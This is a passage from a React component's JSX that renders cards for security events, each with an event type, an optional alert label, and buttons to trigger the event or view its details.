                  </span>
                  <span className="font-mono bg-muted/30 px-2 py-0.5 rounded truncate border border-primary/20">
                    {event.eventType}
                  </span>
                </div>

                {event.detectsAlert && (
                  <div className="flex items-center gap-1.5 text-xs text-amber-400 mb-4">
                    <AlertTriangle className="h-3 w-3" />
                    <span>Triggers: {event.detectsAlert}</span>
                  </div>
                )}

                <div className="flex gap-2">
                  <Button
                    size="sm"
                    onClick={() => triggerEvent(event)}
                    disabled={isLoading}
                    className="flex-1 bg-primary/20 border border-primary/50 hover:bg-primary/30 text-primary"
                  >
                    {isLoading ? (
                      <Loader2 className="h-4 w-4 animate-spin mr-1" />
                    ) : (
                      <Play className="h-4 w-4 mr-1" />
                    )}
                    Trigger
                  </Button>
                  <Button
                    size="sm"
                    variant="outline"
                    onClick={() => viewEventDetails(event)}
                    className="border-primary/30 hover:bg-primary/10"
                  >
                    <ChevronRight className="h-4 w-4" />
                  </Button>
                </div>
              </div>
            );
          })}
        </div>
      </main>
    </div>
  );
}